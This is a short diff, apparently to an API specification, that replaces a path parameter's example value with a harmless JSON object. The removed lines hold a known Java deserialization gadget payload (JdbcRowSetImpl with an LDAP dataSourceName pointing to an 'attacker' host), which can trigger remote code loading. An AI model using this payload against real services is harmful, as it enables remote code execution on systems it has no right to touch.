@@ -1,4 +1,2 @@
 in: path
-example: ["com.sun.rowset.JdbcRowSetImpl",{ "dataSourceName":
-"ldap://attacker/obj", "autoCommit" : true
-}]
+example: {"mergeInfo":"xx"}
